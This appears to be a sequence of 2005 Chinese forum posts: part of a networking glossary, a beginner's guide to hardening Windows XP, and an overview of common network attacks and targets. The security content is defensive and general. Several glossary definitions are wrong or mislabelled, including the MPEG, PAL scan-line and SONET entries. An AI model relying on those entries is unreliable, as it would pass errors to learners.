? Joint Photographic Experts (联合图像专家组, JPEG)压缩―J P E G压缩是使用有失真压
缩技术的压缩标准，由I S O和I T U - T专为静态图像制订 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:53am 

术语表（3） 

L
? LAN Emulation (LAN仿真, LANE)―用于使AT M适应于以太网的技术，它创建一个多
点传送的网络，使得预先配置的以太网结点组能够接收传输。
? LAN emulation (局域网仿真)―局域网仿真是一种网络集成方法，用以在相连的L A N
上格式化所有的包以与AT M通信单元(信元)的外型匹配。
? latency (延迟)―延迟是指网络信息从传输设备发送到接收设备所用的时间。
? line-to-line (视线传输)―视线传输是一种无线电信号传输的类型，其中，信号从一点
向另一点传输，而不是在大气中弹跳，从而可以跨越国家或洲的界限。
? local area network (局域网, LAN)―局域网是一系列互连的计算机、打印设备和其他计算
机设备，它们之间共享硬件和软件资源。局域网通常仅限于给定办公地点、楼层或大楼中。
? local bridge (本机桥)―本机桥是连接临近网络的网络设备，可以用来将网络的一部分
分段以缓解网络流量繁忙的问题。
? local management interface extension (局部管理接口扩展)―添加在帧中继帧上的扩展，
可以提供附加的功能，例如多点传送。
? local router (本地路由器)―本地路由器是在同一座大楼或临近的大楼之间(例如在同一
商业区)连接网络的一种路由器。
? Logical link control (逻辑链路控制, LLC)―这是O S I模型的数据链接子层，用来发起
结点间的通信链接，确保链接不会无意识地中断。
? lossy compression (有失真压缩)―有失真压缩是一种压缩图像的方法，它删除一定百
分比的颜色，使得当图像解压缩时，肉眼不会观察到颜色中细微的变化。
? low earth orbiting satellites (低轨卫星, LEO)―一种通信卫星网络，这种通信卫星距离
地面的高度大约在4 3 5到1 0 0 0英里之间。
M
? Management Information Base (管理信息库, MIB)―存储网络性能信息的数据库，该
数据库被存放在网络代理上，可以从网络管理工作站上进行访问。
? Manchester encoding (曼彻斯特编码)―这是一种状态转换编码形式，其中，从低向高
的转换为二进制0，高向低转换为二进制1。
? media access control (介质存取控制, MAC)―这是数据链接层的子层，用来检查网络
帧中包含的地址信息，并控制同一网络上设备共享通信的方式。
? meshed architecture (网络体系)―一种网络体系，其中有多个备用网络路径，如果一
个路径失效，发送设备会自动地重新路由到另外一个路径，不需要用户干预。
? message switching (报文交换)―这种交换方法将数据从一点发送到另一点，每一个中间
结点都可存储数据、等待闲置的传输信道，并在到达目的地后，将数据提交给下一个点。
? metric (度量)―度量是由路由器计算出来的，反映了有关特定传输途径的信息，如路
径长度、下一跳的负载、可用的带宽和路径可靠性等。
? metropolitan area network (城域网, MAN)―城域网是在一大型城市或地区链接多个
L A N的网络。
? Microcom Network Protocol (Microcom网络协议, MNP)―M N P是一套调制解调器的服
务级别，可以提供有效的通信、错误校验、数据压缩和高输入输出总和等能力。
? modem (调制解调器)―调制解调器将计算机输出的数字信号转换为电话线路可以传输
的模拟信号，然后在接收端将输入的模拟信号转换为计算机可以理解的数字信号。
? Moving Open Shortest Path First Protocol (运动图像专家组, MPEG)压缩―M P E G是由
I S O中的M P E G建立的视频压缩标准。
? multicast (多点传送)―一种传输方法，在这种方法中，服务器将需要一个特定多媒体
传输的用户组合成一组。每个数据流只发送一次，但是到达多个地址，而不是分别给每
个地址发送一次数据。
? Multicast Open Shortest Path First Protocol (广播开放最短路径优先协议, MOSPF)―
M O S P F是一种多点广播路由协议，在为多点广播传输寻找从源到目标的最短路径时，
与O S P F相仿。
? multiple system operator(MSO)―这是提供WA N或Internet 服务的一家有线电视公司。
? multiplexer (多路器)―多路器是一种转换器，将一种通信介质分成多个通道，从而结
点可以同时进行通信。当信号被多路传送时，在另一端也必须要多路转换。
? Multiprotocol over ATM (AT M上的多协议, MPOA)―一种通信技术，使得多协议的通
信量能够在AT M上选择路由。
? multistation access unit (多站访问部件, MAU)―M A U是将许多令牌环结点链接到一个
在物理上很像星型结构的拓扑结构上的中央集线器，但在M A U中，包在逻辑上是以环
形结构进行传输的。
302计计局域网/广域网的设计与实现
下载
? multistation access unit (多站访问部件, MAU)―多站访问部件将令牌环结点链接到一
个物理上像星形但数据信号在逻辑的环形上传输的一种拓扑结构上。 




N
? National Television Standards Committee (国家电视制式委员会, NTSC)―N T S C是为电
视广播传输建立标准的一个组织。由N T S C制订的电视信号传输标准利用了5 2 5条垂直扫
描线，每秒可传输3 0个帧。
? NetBIOS Extended User Interface (NetBIOS扩展用户接口, NetBEUI)― 由I B M在8 0年
代中期开发，此协议集成了N e t B I O S，用于在网络上进行通信。
? Network Basic Input/Output System (网络基本输入/输出系统, NetBIOS)― 将软件与网
络服务相接口的方法，包括提供为工作站和服务器提供一个网络命名惯例。
? Network Control Protocol (网络控制协议, NCP)―A R PA N E T网络协议，其使用要早于
T C P / I P，但是其功能逐渐被T C P / I P取代。
? Network Device Interface Specification (网络驱动程序接口规范, NDIS)―由微软为网
络驱动器开发的一系列标准，使得一个N I C和一个或多个协议进行通信成为可能。
? Network File System (网络文件系统, NFS)Protocol―T C P / I P文件传输协议，该协议使
用记录流而不是使用成批文件流来传输信息。
? Network Node Interface (网络结点接口, NNI)―一个AT M接口，用于两个AT M交换机
之间的连接，有时候也称为网络到网络的接口。
? network traffic (网络信息流通量)―网络信息流通量是指给定时间内，网络上传输的包
的数量、大小和频率。
? Next Hop Resolution Protocol (下一转发分辨协议, NHRP)― 一个协议，当多个网络通
过AT M连接时，它使得一个网络上的发送结点能够判断出要使用的数据链路层的地址，
以便到达另一个网络上的目标结点。
? Open Database Connectivity (开放数据库互连, ODBC)―由微软开发的一种数据库访问
规则和过程，其目的是作为所有类型的关系数据库的一个标准。
? Open Datalink Interface (开放数据链路接口, ODI)― 由Novell NetWa r e使用的驱动器，
用于在多个网络上传输多个协议。
? Open Document Architecture (开放文档体系结构, ODA)―O D A是I S O的标准，是为综
合包含文本、图像、声音和其他表示模式的专门格式化的文档而制订的。
? Open Shortest Path First (开放最短路径优先, OSPF)―开放最短路径优先是路由器采用
的一种路由协议，用来与其他路由器交流有关到其他结点的直接链接等信息。
? Open Systems Interconnection (开放系统互连, OSI)―O S I由I S O和A N S I开发，是一个7
层的模型，为网络上的硬件和软件通信提供一种体制。
术语表计计303
304计计局域网/广域网的设计与实现
下载
? packet (包)―包是为方便在网络上传输而格式化了的数据单元，其中含有与O S I网络
层(即第3层)相应的控制信息及其他信息。
? packet assembler/disassembler (分组组装/拆装器, PA D )―一种将分组封装为X . 2 5格式
并且添加X . 2 5地址信息的设备。当分组到达其目的L A N之后，PA D会把X . 2 5格式信息去
掉。
? packet radio (无线电分组通信)―以短脉冲串的形式通过无线电波传输带有数据的包的
过程。
? packet switching (包交换)―包交换是一种数据传输技术，它在两个传输结点之间建立
起一个逻辑信道，并不停地在许多不同的路径之间发现到达目的地的最好的路由路径。
? partition (分区)―分区即在段的一部分出现故障时关闭电缆段。
? passive hub (无源插孔)―无源插孔是用来以星形拓扑结构连接结点的一种网络传输设
备，当数据信号通过集线器从一个结点传到另一个结点时，不执行信号放大。
? Password Authentication Protocol (口令验证协议, PA P )―当在一个WA N上访问一个服
务器或宿主计算机时，用于验证帐户口令的协议。
? peer protocols (对等协议)―用来使发送结点的O S I模型的各层与相应的接收结点层进
行通信的协议。
? permanent virtual circuit (永久虚拟电路, PVC)―一种通信信道，一直处于连接状态，
不管该结点是否在进行通信。
? phase alternation line (逐行倒相, PA L )―PA L是一种电视传输标准，主要用在非洲、欧
洲、中东和南美洲，它采用了2 5条垂直扫描线，每秒传输2 5帧。
? plain old telephone service (简易老式电话业务, POTS)―规则的语音级电话业务。
? plenum area (高压电缆)―这是一种用特氟纶做套的电缆，由于它在燃烧时不会放射有
毒的气体，所以经常用在高压地区。
? plenum area (高压地区)―高压地区是封闭的地区，其间的大气压要比外界的气压高，
尤其在燃烧时更是如此。建筑物中的高压地区经常可以发展到多个房间或在整个楼层中
蔓延，高压地带包括通风和加热管道。
? Point-to-Point (点到点协议, PPP)― 一个广泛使用的远程通信协议，支持I P X / S P X、
N e t B E U I以及T C P / I P通信。
? power budget (功率分配)―对于光纤电缆通信，功率分配是发送功率和接收器的敏感
性之间的差别，以分贝来衡量。这是信号可以被发送并完好地接受所需要的最小的发送
器功率和接收器敏感性。
? predicted encoding (预测编码)―预测编码是一种视频压缩技术，帧的前一帧具有与其
相同的图像部分，可创建指向这一部分的指针来压缩帧。
? Primary Rate Interface ISDN (ISDN主速率接口, PRI)―I S D N的一种接口，由多个速率
为1 . 5 3 6 M b p s的交换式通信组成。
? primitive (原语)―原语是将O S I协议栈某层的信息传输到另一层(如从物理层传到数据
链接层)的命令。
? Private Network-to-Network Interface(私有网络到网络接口, PNNI)―一个AT M路由选
择协议，最通常使用在与S V C的连接上。
? private automated branch exchange (专用自动交换机, PA B X )―专用自动交换机是一种
专用的自动的电话系统，，但是仍然保留有人工电话总机控制板。
? private branch exchange (专用分组交换机, PBX)―专用分组交换机是一种专用的电话
系统，可以与当地的电话系统相连，也可以不连，它也有一个人工的电话总机控制板。
? private branch exchange (自动用户交换机, PA X )―自动用户交换机是一种完全自动的
(没有电话总机控制板)的专用电话系统。
? promiscuous mode (混合模式)―在混合模式中，在向网络其他连接的段发送帧之前，
网络设备就可以读取帧的目标地址。
? protocol (协议)―协议是人们建立的一套用以指定网络数据如何格式化为包、如何传
输、在接收端如何翻译的标准。
? protocol data unit (协议数据单元, PDU)―在同一个O S I协议栈的各层之间传输的信息。
? Protocol Independent Multicast (协议无关广播, PIM)―协议无关广播是一种多点传送
路由协议，与采用O S P F或R I P为主路由协议的网络兼容。
? public switched telephone network (公用电话交换网络, PSTN)―语音级电话服务。
Q
? Quality of Service (服务质量, QoS)―这是衡量网络传输、质量输入输出总和和可靠性
的手段。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:53am 

术语表（4） 

R
? radio frequency interference (无线电频率干扰, RFI)―因为电气设备发射的无线电波频
率与网络信号传输使用的频率相同而引起的信号干扰为无线电频率干扰，也称射频干
扰。
? R e a l - Time protocol (实时协议, RT P )―实时协议是为实时多媒体应用程序如视频会议
等开发的多点传送协议。
? R e a l - Time Transport Control Protocol (实时传输控制协议, RT C P )―实时传输控制协议
与RT P协同工作，在多点广播传输上提供专门的控制。，如在缺少带宽时，将彩色降级
为单色。RT C P也提供管理信息。
? redirector (转向器)―转向器是一种通过应用层使用的服务，用来识别并访问其他计算
机。
? redundancy (冗余)―提供额外的电缆和设备来保证计算机和计算机系统能够连续地工
作，甚至在一个或多个网络或计算机单元出现故障时仍能正常工作。
? regional Bell operating company, (RBOC)―这是为指定地区提供电话业务的电信公司。
? remote bridge (远程网桥)―远程网桥是穿越同一个城市、在城市之间、在州之间连接
网络以创建一个大网络的设备。
? Remote Network Monitoring (远程网络监控, RMON)―一种利用远程网络结点(例如工
作站或者网络设备)执行网络监控的标准，其功能包括收集信息进行网络协议分析。可
以在网络的远程部分设立监测器，例如中间可以经过一些网桥或者路由器。
? remote router (远程路由器)―远程路由器是跨越极广的地理区域(如城市之间、州之间
和国家之间)将网络连到WA N中的网络设备。
术语表计计305
? repeater (转发器)―转发器是将包放大并重新定时、以让它沿所有连接在转发器上的
输出电缆段发送的网络传输设备。
? Request for Comment (请求注释, RFC)―请求注释是为推动网络互连、Internet 和计算
机通信而发布的信息文档。Internet 工程组( I E T F )负责对R F C进行分类和管理。
? Resource Reservation Protocol (资源预订协议, RSVP)―资源预订协议用于基于T C P / I P
的网络中，可使应用程序能够预订所需要的计算机和网络资源，如带宽、缓冲、最大脉
冲串和服务级别等。R S V P的英文全写为Resource Reservation Protocol ，有时也写作
Resource Reservation Setup Protocol。
? Reverse Address Resolution Protocol(反向地址解析协议, RARP)―一种网络协议，网
络结点上的软件应用或者网络结点本身可以利用该协议确定它自己的I P。
? ring topology (环形拓扑)―在环形拓扑结构中，网络是由数据的连续路径构成的，没
有起始点和终止点，因此也就没有终结器。
? riser cable (上升电缆)―垂直电缆的另一个称呼，指大楼内各楼层间连接用的电缆。
? router (路由器)―路由器是连接访问方法相同或不同的网络的网络设备，如路由器可
以将以太网与令牌环网相连。路由器根据源于网络管理员的路由表数据、发现的最有效
的路由和预编程信息，使用决策进程来向网络提交包。
? Routing Information Protocol (路由信息协议, RIP)―路由信息协议是路由器用来与其
他路由器交流整个路由表的协议。
S
? scan lines (扫描线)―扫描线用来构造电视视频图像。扫描线中含有图像的片面视图，
并从上到下在显示器上显示。在美国，一个电视帧由5 2 5扫描线组成。
? Secure Sockets Layer (加密套接字协议层, SSL)―S S L是一种在服务器和客户端采用的
数字加密技术，例如在客户端的浏览器和Internet 服务器之间可以使用S S L。
? segment (段)―段是符合I E E E规范的一条电缆，如一段1 8 5米长带有3 0个结点(包括终
结器和网络设备)的10Base2 电缆。
? Sequence Packet Exchange (序列包交换, SPX)―一个N o v e l l协议，当对数据可靠性有
特殊要求时，用于应用软件的网络传输。
? serial Line Internet Protocol (串行线路互连网协议, SLIP)― 一个电信网络的WA N协
议，用于在两个电信载波之间建立最快的路由。
? Service data unit (服务数据单元, SDU)―S D U是一种已经在O S I层间进行过转换并删除
了其中的控制信息和转换指令的协议数据单元。
? service level agreement (服务标准协议, SLA)―WA N服务提供商提出的服务标准书面
保证，包括线路必须有效的最小时间。
? shielded twisted-pair cable (屏蔽双绞线, STP)―屏蔽双绞线是一种网络电缆，由绞在
一起的绝缘电线对组成，并包围着一层屏蔽材料，以进行E M I和R F I保护。所有这些都
处在一个保护套管中。
? Simple Network Management (简单网络管理协议, SNMP)―T C P / I P协议套中的一个协
议，计算机或者网络设备可以通过该协议收集关于网络性能的标准化数据。
306计计局域网/广域网的设计与实现
下载
? spanning tree algorithm (生成树算法)―生成树算法是用以确保帧不会无限循环传输的
软件，并可以使帧沿成本最低最有效的网络路径传输。
? spread-spectrum communications (传播光谱技术)―这种通信技术主要用在无线网络
中，在网络间进行高频率通信时可以用它来替代电缆。
? star topology (星形拓扑)―这是最古老的一种网络设计，整个网络是由多个连接在集
线器上的结点构成。
? stateful autoconfiguration (有状态自动配置)―一种利用网络管理软件，基于网络管理
员给出的一组参数自动分配I P地址的技术。
? stateless autoconfiguration (无状态自动配置)―一种分配I P地址的方法，在该方法中，
网络设备自己给自己分配地址。
? state-transition encoding (状态转换编码)―这是一种检验信号状态的改变(如从高到低、
从低到高等)的数字编码方法。
? static routing (静态路由)―静态路由是一种路由进程，包括对网络管理员根据预先调
试的路由指令而做出的路由决定的控制。
? statistical multiple access (统计多路访问)―统计多路访问是根据任务所需分配通信资
源的一种交换方法，例如，给视频文件分配更多的带宽，而给较小的电子表文件分配较
少的带宽。
? store-and-forward switching (存储转发交换)―在存储转发交换技术中，包可以被缓存，
直到完全接收后再发送，并且网络上有一条开放的信道可以发送包。
? streaming (流)―在从网络接收来的M P E G视频文件完全下载之前播放。
? subnet mask (子网模)―子网模(也称子网掩码)是I P地址的某个确定的部分，用于指明
一个网络的地址类别，可以利用它将网络分成子网，以便进行网络流量管理。
? Switched Multimegabit Data Services (交换多兆位数据服务, SMDS)―也叫做交换式兆
位数据服务，是一种由地区电话公司开发的传输方法，利用该技术可以在M A N和WA N
上提供基于信元的高速通信。
? switched virtual circuit (交换虚拟电路, SVC)―为持续的通信会话而创建的一种通信信
道，通常位于可以处理多个信道的介质上。
? synchronous communications (同步通信)―由数据的连续脉冲串进行的通信，而且数
据的连续脉冲串要受每一个脉冲串起始位置的时钟信号控制。
? synchronous communications (异步通信0―异步通信发生离散的单元中，在离散单元
里，单元的开始位置由前面的开始位标示，终止位由单元最后的停止位给出信号。
? synchronous optical network (同步光纤网络, ONET)―一种光纤通信技术，可以进行高
速的数据通信(每秒在兆位以上)。基于S O N E T的网络可以完成语音、数据和视频通信。
? System Network Architecture (系统网络结构, SNA)―系统网络结构是I B M使用的一种
分层通信协议，以便I B M主机和终端进行通信。
? Systeme Electronique Pour Couleur Avec Memoire (顺序与存储彩色电视系统, SECAM)
―顺序与存储彩色电视系统是一种与PA L相似的电视传输标准，但是是用在法国、俄
国和非洲的一些国家。 



T
? T-carrier (T载波)―T载波是可用于数据通信的专用电话线路，将两个不同的位置连接
起来，以进行点对点的通信。
? TCP port (TCP端口)―与虚拟电路类似的一种功能，通过T C P端口，位于两个通信结
点或者设备上的单个进程之间可以进行通信。每个通信的进程都有自己的端口号，在有
多个进程同时进行通信的时候，可以使用多个端口。
? telco―地区的电话公司，如US We s t。
? Telecommunications Industry Association (通信工业联合会, TIA)―T I A是E 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:54am 

术语表（5） 


I A中的建立
标准的一个实体，主要开发远程通信和布线标准。
? television frame (电视帧)―电视帧是一系列图片中用来模仿动作的一幅完整的图片。
? Te l n e t―一种T C P / I P应用协议，可以提供终端仿真。
? terminal (终端)―终端是具有监视器和键盘的设备，但对本地处理而言是没有C P U的。
终端与主机相连，处理过程均在主机上完成。
? terminal adapter (终端适配器, TA )―终端适配器是将计算机或传真机连接在I S D N线路
上的设备。终端适配器可将数字信号转变为可以在数字电话线路上发送的协议。
? terminal emulation (终端仿真)―用软件来使计算机(如P C )的行为类似于终端。
? time-division multiple access (时分多路访问技术)―这种交换方法通过划分时间槽(每
个时间槽对应一台设备，设备从中可以进行信号传输)使得多个设备可以在同一种通信
介质上进行通信。
? token ring (令牌环)―这是由I B M公司于7 0年代开发的一种访问方法，它仍然保留着主
要的L A N技术。这种传输方法在物理上采用星形拓扑结构，而在逻辑上采用环形拓扑结
构。虽然在令牌环网中，每一个结点也连接在中央集线器上，但包在结点到结点间进行
传输时就好像没有开始点和终止点一样。
? topology (拓扑结构)―拓扑结构是电缆上发送包所遵循的电缆的物理布局和逻辑路径。
? translation (转换)―转换是一种传输协议转变为另一种传输协议的方法。
? translational bridge (转换网桥)―转换网桥是使用不同传输协议的网络间的网桥，它可
以向网络传送适当的不同协议。
? Transmission Control Protocol (传输控制协议, TCP)―这是一种传输协议，属于T C P / I P
协议套的一部分，用于在网络软件应用进程之间建立通信会话，并且可以通过控制数据
流量做到可靠的端到端数据传输。
? Trivial File Transfer Protocol (普通文件传输协议, TFTP)―T C P / I P文件传输协议，用于
传输无盘工作站启动所使用的文件。
? trunking (中继)―在两个网络传输设备之间的两个或多个物理链接，它们组成一个集
合可当做一条线路使用，总的传输速率是每个链接传输速率的总和。
? twisted-pair cable (双绞线)―双绞线是一种柔性通信电缆，其中包含着绞在一起的成
对的绝缘铜线以减少E M I和R F I的干扰，双绞线的外部还覆盖着一层绝缘套管。
下载
? uninterruptible power supply (不间断电源, UPS)―在电源故障或电压不足时，提供快
速电池供电的设备，有时是在一个电子设备中，有时作为一个单独的设备。
? universal serial bus (通用串行总线, USB)―通用串行总线是为连接各种外设(如打印
机、调制解调器、磁带驱动器)而建立的标准，将要替代传统并行和串行端口的使用。
? unshielded twisted-pair cable ( 非屏蔽双绞线, UTP)―这是一种在绞在一起的成对的绝
缘线和外部套管间没有屏蔽的电缆。
? User Datagram Protocol (用户数据报协议, UDP)―一种使用I P的协议，它和T C P的位
置一样，可以提供低开销的无连接服务。
? U s e r-Network Interface(用户―网络接口, UNI)―一个AT M接口，用于终端结点到交换
机的连接。
V
? virtual circuit (虚拟电路)―虚拟电路是由O S I网络层为发送和接收数据而建立的逻辑
通信路径。
? virtual LAN (虚拟局域网, VLAN)―虚拟局域网是在子网组之外建立的逻辑网络，而
子网组是通过交换机和路由器上的智能软件建立并独立于物理网络拓扑结构的。
? virtual path identifier/virtual channel identifier ( 虚拟路径标识符/虚拟通道标识符,
V P I / V C I )― AT M信元中的一个编码，使得信元能够到达想要到达的输出接口。
W
? wavelength division multiplexing (波长分割多路转接器, WDM)―波长分割多路转接器
是一种用于光纤介质的交换技术，可以截取几个输入连接，并将其转化为在光纤电缆上
传送的光谱范围内的不同的波长。
? wide area network (广域网, WA N )―广域网是一种意义深远的网络系统，可以跨越极
大的物理空间。
X
? X . 2 5―一种老的非常可靠的分组交换协议，最高可以以2 . 0 4 8 M b p s的速率连接到远程
的网络上。X . 2 5协议定义了D T E和D C E之间的通信。
? X/Open XA―基于U N I X的系统所使用的一种开放数据库标准。
? Xerox Network System (施乐网络系统, XNS)― 一个由施乐公司在网络早期开发的用
于以太网通信的协议。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:54am 

个人电脑安全 


由于现在用xp的用户相对多一点，所以以下基本都是针对xp的，当然有很多都是通用的，由于考虑到新手，所以讲的都是基础的，好接受点。哪里不好的请直言。
好了，follow me 


一：计算机个人密码 

添加一个合法用户，尽量不使用管理员账号登陆。这里告诉大家一个小技巧，把管理员账号的名称（ＡＤＭＩＮＩＳＴＲＡＴＯＲ）改成一个不起眼的名字（控制面板-用户帐户里改）。然后建立一个受限的用户（名字设为ａｄｍｉｎｉ），限制他的种种操作，并设置繁杂的密码,这样……不用说了吧（当别人费尽九牛二虎之力进来时发觉…………？　把它气死！！！！）
--------------snowchao
还有设置复杂的口令，更改有助于防止口令蠕虫轻易的进入系统。 

二：禁用没用的服务 


这是icool早期的作品，呵呵，相信很多人都看过了，不过对刚来的还是很有用的哦。
关闭了这些服务不仅增加了安全系数，而且可以使你的爱机提速
不过当你遇到禁用了某些服务后有些东西不能用了就马上去看看被禁用的服务的说明 

三：关闭不用的端口 

如果觉得下面的端口所对应的服务没用，那么就关了好了
下面是几个常见的端口的关闭方法 

1、139端口的关闭
139端口是NetBIOS　Session端口，用来文件和打印共享
关闭139口听方法是在“网络和拨号连接”中“本地连接”中选取“Internet协议(TCP/IP)”属性，进入“高级TCP/IP设置”“WINS设置”里面有一项“禁用TCP/IP的NETBIOS”，打勾就关闭了139端口。 

2、445端口的关闭
修改注册表，添加一个键值
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NetBT\Parameters在右面的窗口建立一个SMBDeviceEnabled 为REG_DWORD类型键值为 0
这样就ok了 

3、3389端口的关闭
xp：我的电脑上点右键选属性-->远程，将里面的远程协助和远程桌面两个选项框里的勾去掉。 

win2000server 开始-->程序-->管理工具-->服务里找到Terminal Services服务项，
选中属性选项将启动类型改成手动，并停止该服务。 

win2000pro 开始-->设置-->控制面板-->管理工具-->服务里找到Terminal Services
服务项，选中属性选项将启动类型改成手动，并停止该服务。 

四：漏洞检测，补丁 

下面是天网的一个检测个人系统漏洞的网址，大家可以去检测一下自己的系统
http://pfw.sky.net.cn/news/info/list.php?sessid=&sortid=17 

还有瑞星杀毒软件也有检测系统漏洞的功能（打开瑞星-工具-系统漏洞扫描）
当发现漏洞后就要去堵漏洞了，接下来就是打补丁，不仅可以增强兼容性外，更重要的是堵上已发现的安全漏洞。但是不是打上所以的补丁就最好，最好当你下载前先看一下是什么内容的，如果是你已经关闭了服的务之类的补丁就不用下了。 

下面是上海交大的下载页面，安全系数高点，可以下载系统未打的补丁
http://windowsupdate.sjtu.edu.cn/ 

五：杀毒软件和防火墙 

要系统安全，防火墙是很重要的，当然，有了防火墙也不是没事了，还要记得定时升级杀毒软件杀毒。一般一新期一次差不多了。
建议不要装过多的防火墙和杀毒软件，这样可以加快启动，也可以避免某些冲突。下面的防火墙和杀毒软件是新手区推荐的
http://hackbase.com/bbs/viewthread.php?tid=34405 

六：数据备份 

系统还原是默认打开的，它会自动备分，当遇到不可解决的问题时，可以尝试一下系统还原，而不用重装系统。开始-运行输入msconfig在一般这项里有“开始系统还原一项”如果要还原就点这里了。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:54am 

网络安全知识（1） 

一旦黑客定位了你的网络，他通常会选定一个目标进行渗透。通常这个目标会是安全漏洞最多或是他拥有最多攻击工具的主机。非法入侵系统的方法有很多，你应当对这些方法引起注意。 
　　常见攻击类型和特征 

　　攻击特征是攻击的特定指纹。入侵监测系统和网络扫描器就是根据这些特征来识别和防范攻击的。下面简要回顾一些特定地攻击渗透网络和主机的方法。 

　　常见的攻击方法 

　　你也许知道许多常见的攻击方法，下面列出了一些： 

　　・ 字典攻击：黑客利用一些自动执行的程序猜测用户命和密码，审计这类攻击通常需要做全面的日志记录和入侵监测系统（IDS）。 

　　・ Man-in-the-middle攻击：黑客从合法的传输过程中嗅探到密码和信息。防范这类攻击的有效方法是应用强壮的加密。 

　　・ 劫持攻击：在双方进行会话时被第三方（黑客）入侵，黑客黑掉其中一方，并冒充他继续与另一方进行会话。虽然不是个完全的解决方案，但强的验证方法将有助于防范这种攻击。 

　　・ 病毒攻击：病毒是能够自我复制和传播的小程序，消耗系统资源。在审计过程中，你应当安装最新的反病毒程序，并对用户进行防病毒教育。 

　　・ 非法服务：非法服务是任何未经同意便运行在你的操作系统上的进程或服务。你会在接下来的课程中学到这种攻击。 

　　・ 拒绝服务攻击：利用各种程序（包括病毒和包发生器）使系统崩溃或消耗带宽。 

　　容易遭受攻击的目标 

　　最常遭受攻击的目标包括路由器、数据库、Web和FTP服务器，和与协议相关的服务，如DNS、WINS和SMB。本课将讨论这些通常遭受攻击的目标。 

　　路由器 

　　连接公网的路由器由于被暴露在外，通常成为被攻击的对象。许多路由器为便于管理使用SNMP协议，尤其是SNMPv1，成为潜在的问题。许多网络管理员未关闭或加密Telnet会话，若明文传输的口令被截取，黑客就可以重新配置路由器，这种配置包括关闭接口，重新配置路由跳计数等等。物理安全同样值得考虑。必须保证路由器不能被外人物理接触到进行终端会话。 

　　过滤Telnet 

　　为了避免未授权的路由器访问，你应利用防火墙过滤掉路由器外网的telnet端口和SNMP[161,162]端口 

　　技术提示：许多网络管理员习惯于在配置完路由器后将Telnet服务禁止掉，因为路由器并不需要过多的维护工作。如果需要额外的配置，你可以建立物理连接。 

　　路由器和消耗带宽攻击 

　　最近对Yahoo、e-Bay等电子商务网站的攻击表明迅速重新配置路由器的重要性。这些攻击是由下列分布式拒绝服务攻击工具发起的： 

　　・ Tribal Flood Network(TFN) 

　　・ Tribal Flood Network(TFN2k) 

　　・ Stacheldraht（TFN的一个变种） 

　　・ Trinoo（这类攻击工具中最早为人所知的） 

　　因为许多公司都由ISP提供服务，所以他们并不能直接访问路由器。在你对系统进行审计时，要确保网络对这类消耗带宽式攻击的反映速度。你将在后面的课程中学习如何利用路由器防范拒绝服务攻击。 

　　数据库 

　　黑客最想得到的是公司或部门的数据库。现在公司普遍将重要数据存储在关系型或面向对象的数据库中，这些信息包括： 

　　・ 雇员数据，如个人信息和薪金情况。 

　　・ 市场和销售情况。 

　　・ 重要的研发信息。 

　　・ 货运情况。 

　　黑客可以识别并攻击数据库。每种数据库都有它的特征。如SQL Server使用1433/1434端口，你应该确保防火墙能够对该种数据库进行保护。你会发现，很少有站点应用这种保护，尤其在网络内部。 
服务器安全　　WEB和FTP这两种服务器通常置于DMZ，无法得到防火墙的完全保护，所以也特别容易遭到攻击。Web和FTP服务通常存在的问题包括： 

　　・ 用户通过公网发送未加密的信息； 

　　・ 操作系统和服务存在众所周知的漏洞导致拒绝服务攻击或破坏系统； 

　　・ 旧有操作系统中以root权限初始运行的服务，一旦被黑客破坏，入侵者便可以在产生的命令解释器中运行任意的代码。 

　　Web页面涂改 

　　近来，未经授权对Web服务器进行攻击并涂改缺省主页的攻击活动越来越多。许多企业、政府和公司都遭受过类似的攻击。有时这种攻击是出于政治目的。大多数情况下Web页面的涂改意味着存在这入侵的漏洞。这些攻击通常包括Man-in-the-middle攻击（使用包嗅探器）和利用缓冲区溢出。有时，还包括劫持攻击和拒绝服务攻击。 

　　邮件服务 

　　广泛使用的SMTP、POP3和IMAP一般用明文方式进行通信。这种服务可以通过加密进行验证但是在实际应用中通信的效率不高。又由于大多数人对多种服务使用相同的密码，攻击者可以利用嗅探器得到用户名和密码，再利用它攻击其它的资源，例如Windows NT服务器。这种攻击不仅仅是针对NT系统。许多不同的服务共享用户名和密码。你已经知道一个薄弱环节可以破坏整个的网络。FTP和SMTP服务通常成为这些薄弱的环节。 

　　与邮件服务相关的问题包括： 

　　・ 利用字典和暴力攻击POP3的login shell； 

　　・ 在一些版本中sendmail存在缓冲区溢出和其它漏洞； 

　　・ 利用E-mail的转发功能转发大量的垃圾信件 

　　名称服务 

　　攻击者通常把攻击焦点集中在DNS服务上。由于DNS使用UDP，而UDP连接又经常被各种防火墙规则所过滤，所以许多系统管理员发现将DNS服务器至于防火墙之后很困难。因此，DNS服务器经常暴露在外，使它成为攻击的目标。DNS攻击包括： 

　　・ 未授权的区域传输； 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:55am 

网络安全知识（2） 

　・ DNS 毒药，这种攻击是指黑客在主DNS服务器向辅DNS服务器进行区域传输时插入错误的DNS信息，一旦成功，攻击者便可以使辅DNS服务器提供错误的名称到IP地址的解析信息； 

　　・ 拒绝服务攻击； 

　　其它的一些名称服务也会成为攻击的目标，如下所示： 

　　・ WINS，“Coke”通过拒绝服务攻击来攻击没有打补丁的NT系统。 

　　・ SMB服务（包括Windows的SMB和UNIX的Samba）这些服务易遭受Man-in-the-middle攻击，被捕获的数据包会被类似L0phtCrack这样的程序破解。 

　　・ NFS和NIS服务。这些服务通常会遭受Man-in-the-middle方式的攻击。 

　　在审计各种各样的服务时，请考虑升级提供这些服务的进程。 


　　审计系统BUG 

　　作为安全管理者和审计人员，你需要对由操作系统产生的漏洞和可以利用的软件做到心中有数。早先版本的Microsoft IIS允许用户在地址栏中运行命令，这造成了IIS主要的安全问题。其实，最好的修补安全漏洞的方法是升级相关的软件。为了做到这些，你必须广泛地阅读和与其他从事安全工作的人进行交流，这样，你才能跟上最新的发展。这些工作会帮助你了解更多的操作系统上的特定问题。 

